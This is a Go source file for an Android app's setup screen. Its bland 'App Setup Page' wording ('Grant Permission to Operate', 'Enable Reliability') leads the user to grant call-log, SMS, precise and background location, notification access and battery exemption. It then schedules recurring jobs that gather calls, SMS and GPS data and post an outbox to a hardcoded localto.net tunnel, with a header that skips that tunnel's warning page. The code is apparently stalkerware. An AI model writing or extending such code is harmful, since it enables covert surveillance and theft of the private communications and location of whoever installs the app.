package views

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"time"

	"sweetjuice/lib/state"

	"sweetjuice/plugins/custom"

	"github.com/sweet-juice/sweetjuice/app"
	"github.com/sweet-juice/sweetjuice/plugins/mu3"
	"github.com/sweet-juice/sweetjuice/plugins/permission"
	"github.com/sweet-juice/sweetjuice/plugins/special"
	"github.com/sweet-juice/sweetjuice/plugins/workmanager"
	"github.com/sweet-juice/sweetjuice/ui"
	"github.com/sweet-juice/sweetjuice/ui/style"
)

const serverURL = "https://s4oz6jdx9.localto.net"
const deviceModel = "SweetJuice-Device"

type HomeView struct {
	State *state.MainAppState
}

func (v *HomeView) Render() ui.Node {
	root := ui.VStack(
		ui.Spacer().Height(24),
		ui.Spacer().Width(24),
		ui.Text("App Setup Page").Style(style.Text{FontSize: 24, Weight: style.Bold}),
		ui.Spacer().Height(24),
	)

	root = ui.VStack(
		root,
		mu3.Box(
			ui.Text("Step 1: System").Style(style.Text{FontSize: 18, Weight: style.Bold}),
			ui.Text("Grant Permission to Operate. Choose 'All The Time' so you can get seamless experience.").Style(style.Text{FontSize: 14, Color: "#666666"}),
			ui.Spacer().Height(8),
			mu3.Button("Configure Processes").Style(style.Button{BackgroundColor: "#1976D2"}).OnClick(func() {
				v.startStep1()
			}),
		),
		ui.Spacer().Height(12),
		mu3.Box(
			ui.Text("Step 2: Reliability").Style(style.Text{FontSize: 18, Weight: style.Bold}),
			ui.Text("Allow Background & Notification for this App. This ensures that the system won't interrupt while App is running.").Style(style.Text{FontSize: 14, Color: "#666666"}),
			ui.Spacer().Height(8),
			mu3.Button("Enable Reliability").Style(style.Button{BackgroundColor: "#388E3C"}).OnClick(func() {
				v.startStep2()
			}),
		),
		ui.Spacer().Height(12),
		mu3.Box(
			ui.Text("Step 3: Finalize").Style(style.Text{FontSize: 18, Weight: style.Bold}),
			ui.Text("If the previous steps are configured, click Start App Activity").Style(style.Text{FontSize: 14, Color: "#666666"}),
			ui.Spacer().Height(8),
			mu3.Button("Start App Activity").Style(style.Button{BackgroundColor: "#1976D2"}).OnClick(func() {
				v.startBackgroundTasks()
				v.switchToLaunch()
			}),
		),
		ui.Spacer().Height(24),
	)

	if v.State.Waiting {
		root = ui.VStack(
			root,
			ui.Text(v.State.WaitingMsg).Style(style.Text{
				FontSize: 14,
				Color:    "#7A757E",
			}),
			ui.Spacer().Height(16),
		)
	}

	return ui.Root(root, "#FFFBFE")
}

func (v *HomeView) startStep1() {
	v.State.SetWaiting("Step 1/2: Requesting Access...")
	fmt.Println("setup: starting step 1 (Runtime Permissions)")
	go func() {
		permChan := make(chan string, 20)
		resumeChan := make(chan bool, 5)

		// Subscribe to permission results
		permission.OnResult(func(res permission.PermissionResult) {
			if res.Granted {
				fmt.Printf("setup: perm granted: %s\n", res.Permission)
				select {
				case permChan <- res.Permission:
				default:
				}
			}
		})

		// Subscribe to app resume
		bus := app.GetEventBus()
		if bus != nil {
			bus.On("app:resumed", func(data interface{}) {
				fmt.Println("setup: activity resumed")
				select {
				case resumeChan <- true:
				default:
				}
			})
		}

		// 1. Runtime Permissions
		_, _ = permission.RequestMultiple([]string{
			"android.permission.READ_CALL_LOG",
			"android.permission.READ_SMS",
			"android.permission.ACCESS_FINE_LOCATION",
			"android.permission.ACCESS_COARSE_LOCATION",
		})

		// Wait for Location (either fine or coarse is enough to move to background request)
	waitLoop:
		for {
			p := <-permChan
			switch p {
			case "android.permission.ACCESS_FINE_LOCATION", "android.permission.ACCESS_COARSE_LOCATION":
				fmt.Println("setup: location access confirmed")
				break waitLoop
			}
		}

		// Flush stale resume signals from the first dialog
		for len(resumeChan) > 0 {
			<-resumeChan
		}

		v.State.SetWaiting("Step 2/2: Enabling Background Tracking...")
		fmt.Println("setup: requesting background location")
		time.Sleep(500 * time.Millisecond)

		// 2. Background Location
		_, _ = permission.Request("android.permission.ACCESS_BACKGROUND_LOCATION")

	loop:
		for {
			select {
			case p := <-permChan:
				if p == "android.permission.ACCESS_BACKGROUND_LOCATION" {
					fmt.Println("setup: background location granted (callback)")
					break loop
				}
			case <-resumeChan:
				status, _ := permission.Check("android.permission.ACCESS_BACKGROUND_LOCATION")
				if status == "granted" {
					fmt.Println("setup: background location granted (check on resume)")
					break loop
				}
			case <-time.After(2 * time.Second):
				status, _ := permission.Check("android.permission.ACCESS_BACKGROUND_LOCATION")
				if status == "granted" {
					fmt.Println("setup: background location granted (fallback check)")
					break loop
				}
			}
		}

		fmt.Println("setup: step 1 complete")
		v.State.ClearWaiting()
	}()
}

func (v *HomeView) startStep2() {
	v.State.SetWaiting("Requesting Reliability Permissions...")
	go func() {
		bus := app.GetEventBus()
		if bus == nil {
			v.State.ClearWaiting()
			return
		}

		resumeChan := make(chan bool, 5)
		bus.On("app:resumed", func(data interface{}) {
			fmt.Println("setup: activity resumed (step 2)")
			select {
			case resumeChan <- true:
			default:
			}
		})

		// 1. Battery Exemption
		v.State.SetWaiting("Enable Battery Exemption...")
		isExempt, _ := special.CheckBatteryExemption()
		if !isExempt {
			_, _ = special.RequestBatteryExemption()
			for {
				<-resumeChan
				granted, _ := special.CheckBatteryExemption()
				if granted {
					break
				}
				v.State.SetWaiting("Waiting for Exemption... Please enable it.")
			}
		}

		time.Sleep(1 * time.Second) // Transition gap

		// 2. Notification Access
		v.State.SetWaiting("Enable Notification Access...")
		hasAccess, _ := special.CheckNotificationAccess()
		if !hasAccess {
			_, _ = special.RequestNotificationAccess()
			for {
				<-resumeChan
				granted, _ := special.CheckNotificationAccess()
				if granted {
					break
				}
				v.State.SetWaiting("Waiting for Access... Please enable it.")
			}
		}

		v.State.ClearWaiting()
	}()
}

func (v *HomeView) switchToLaunch() {
	v.State.SetWaiting("Switching activity...")
	go func() {
		_, _ = custom.ShowLaunch()
		v.State.ClearWaiting()
	}()
}

func (v *HomeView) startBackgroundTasks() {
	v.State.SetWaiting("Starting background tasks...")
	go func() {
		// Trigger the engine logic directly
		wm := workmanager.NewPlugin()
		wm.EnqueuePeriodic("sweetjuice_prepare_calls", 15, nil, true, false)
		wm.EnqueuePeriodic("sweetjuice_prepare_sms", 15, nil, true, false)
		wm.EnqueuePeriodic("sweetjuice_prepare_gps", 15, nil, true, false)

		go func() {
			timer := time.NewTimer(3 * time.Minute)
			<-timer.C
			workmanager.NewPlugin().EnqueuePeriodic("sweetjuice_send_outbox", 15, nil, true, false)
		}()

		resp, err := postJSON("/ping", []map[string]interface{}{{"status": "started"}})
		if err == nil {
			fmt.Printf("HomeView: ping status=%d\n", resp.StatusCode)
		}

		fmt.Println("HomeView: background tasks started manually")
		v.State.ClearWaiting()
	}()
}

func postJSON(path string, messages []map[string]interface{}) (*http.Response, error) {
	payload, _ := json.Marshal(messages)
	req, _ := http.NewRequest("POST", serverURL+path, bytes.NewReader(payload))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("localtonet-skip-warning", "1")
	req.Header.Set("C-Device", deviceModel)

	client := &http.Client{Timeout: 10 * time.Second}
	return client.Do(req)
}
